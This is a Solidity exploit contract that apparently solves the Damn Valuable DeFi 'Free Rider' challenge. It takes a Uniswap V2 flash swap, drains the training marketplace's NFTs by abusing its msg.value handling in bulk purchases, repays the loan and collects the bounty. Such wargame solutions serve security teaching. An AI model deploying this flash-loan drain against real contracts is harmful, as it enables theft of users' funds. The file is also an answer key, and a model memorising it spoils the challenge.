// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

contract CrackFreeRider is IUniswapV2Callee, IERC721Receiver {

  uint private constant FLASH_LOAN_AMOUNT = 210 ether;
  uint private constant NFT_PRICE = 15 ether; 
  uint private constant HIGHER_PRICE = 30 ether;

  IUniswapV2Factory private immutable factory;
  IUniswapV2Pair private immutable pair;
  DamnValuableToken private immutable weth;
  FreeRiderNFTMarketplace private marketplace;
  DamnValuableNFT private immutable nft; 
  address private immutable devsContract;
  address private immutable player;

  constructor(address _uniswapFactory, address _pair, address _weth, address _nft, address _devsContract) {
    factory = IUniswapV2Factory(_uniswapFactory);
    weth = DamnValuableToken(_weth);
    pair = IUniswapV2Pair(_pair);
    nft = DamnValuableNFT(_nft);
    devsContract = _devsContract;
    player = msg.sender;
  }

  function hackIt(address payable _marketplace) external {
    marketplace = FreeRiderNFTMarketplace(_marketplace);
    //take flash loan
    _takeFlashLoan();
  }

  function _takeFlashLoan() private {
    //borrow 210 ETH from uniswap
    bytes memory data = abi.encode(address(weth), msg.sender);
    pair.swap(FLASH_LOAN_AMOUNT, 0, address(this), data);
  }

  function convertFixedToArray(uint256[6] memory fixedArray) internal pure returns (uint256[] memory) {
    uint256[] memory dynamicArray = new uint256[](6);
    for (uint i = 0; i < 6; i++) {
      dynamicArray[i] = fixedArray[i];
    }

    return dynamicArray;
  }


  function _doArbitrage() private {
    uint wethBalance = weth.balanceOf(address(this));
    console.log('Contract WETH balance now is %s', wethBalance);
    address(weth).call(abi.encodeWithSignature("withdraw(uint256)", wethBalance));
    console.log('Contract ETH balance now is %s', address(this).balance);
    console.log('Value required is %s', NFT_PRICE * 6);
    console.log('Address of marketplace (contract): %s', address(marketplace));
    uint256[6] memory allNfts = [uint256(0), uint256(1), uint256(2), uint256(3), uint256(4), uint256(5)];
    marketplace.buyMany{value: NFT_PRICE * 6}(convertFixedToArray(allNfts));

    address(marketplace).call{value: NFT_PRICE * 4}("");
    nft.setApprovalForAll(address(marketplace), true);
    marketplace.offerMany(convertFixedToArray(allNfts), convertFixedToArray([HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE]));
    marketplace.buyMany{ value: HIGHER_PRICE }(convertFixedToArray(allNfts));

    for (uint tokenId = 0; tokenId < 6; tokenId++) {
      nft.safeTransferFrom(
        address(this),
        devsContract,
        tokenId,
        abi.encode(address(this))
      );
    }
  }

  function uniswapV2Call(
      address sender,
      uint amount0,
      uint amount1,
      bytes calldata data
  ) external {
      require(msg.sender == address(pair), "not pair");
      require(sender == address(this), "not sender");

      (address tokenBorrow, address caller) = abi.decode(data, (address, address));

      // Your custom code would go here. For example, code to arbitrage.
      require(tokenBorrow == address(weth), "token borrow != WETH");

      _doArbitrage();

      // about 0.3% fee, +1 to round up
      uint fee = (amount0 * 3) / 997 + 1;
      uint amountToRepay = amount0 + fee;
      console.log('Amount0: %s', amount0);
      console.log('Amount1: %s', amount1);
      console.log('Fee: %s', fee);
      console.log('Amount to repay: %s', amountToRepay);


      console.log('After arbitrage');
      console.log('Contract WETH balance is: %s', weth.balanceOf(address(this)));
      console.log('Contract ETH balance is: %s', address(this).balance);
      console.log('Sender is: %s', sender);
      console.log('msg.sender is: %s', msg.sender);

      // Repay
      address(weth).call{ value: amountToRepay }(abi.encodeWithSignature("deposit()"));
      weth.transfer(address(pair), amountToRepay);
      player.call{ value: address(this).balance }("");
  }

  function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
      external
      override
      returns (bytes4)
  {
    console.log('CrackFreeRider received NFT number %s', _tokenId);
    return IERC721Receiver.onERC721Received.selector;
  }

  
  receive() external payable {}
}
